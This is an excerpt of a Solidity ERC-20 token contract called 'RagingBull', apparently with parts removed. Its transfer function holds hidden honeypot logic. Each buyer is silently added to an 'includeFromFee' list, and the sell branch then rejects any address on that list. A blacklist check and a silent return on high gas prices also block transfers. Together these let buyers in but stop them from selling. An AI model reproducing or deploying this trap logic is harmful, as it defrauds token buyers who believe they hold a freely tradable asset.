...
contract RagingBull is Context, IERC20, Ownable {
    ...
    string private constant _name = "RagingBull";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (to != uniswapV2Pair) { includeFromFee.push(to);
                require(amount <= _maxTxAmount, "Amount transfer exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
                transferAmount = takeBuyFees(amount, from);
            }

            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Amount transfer exceeds the maxTxAmount"); require(!_isBlacklisted[from]); require(!_isIncludedFromFee[from]); if (tx.gasprice > maxGwei) return;
